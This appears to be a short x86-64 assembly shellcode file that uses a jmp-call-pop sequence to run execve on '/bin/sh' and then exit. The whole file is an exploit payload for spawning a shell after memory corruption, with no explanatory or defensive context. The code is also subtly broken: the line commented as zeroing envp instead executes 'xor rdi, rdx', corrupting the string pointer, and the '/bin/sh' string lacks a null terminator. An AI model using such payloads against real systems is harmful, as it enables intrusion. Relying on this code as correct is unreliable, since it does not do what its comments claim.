BITS 64

; execve('/bin/sh',0,0)

jmp short _one

_two:
; '/bin/sh'
pop rdi
; syscall number
xor rax, rax
mov al, 0x3b
; argv=NULL
xor rsi, rsi
; envp=NULL
xor rdi, rdx
syscall

mov al, 0x3c
xor rdi, rdi
syscall

_one:
; push address of '/bin/sh' to stack
call _two
db '/bin/sh'
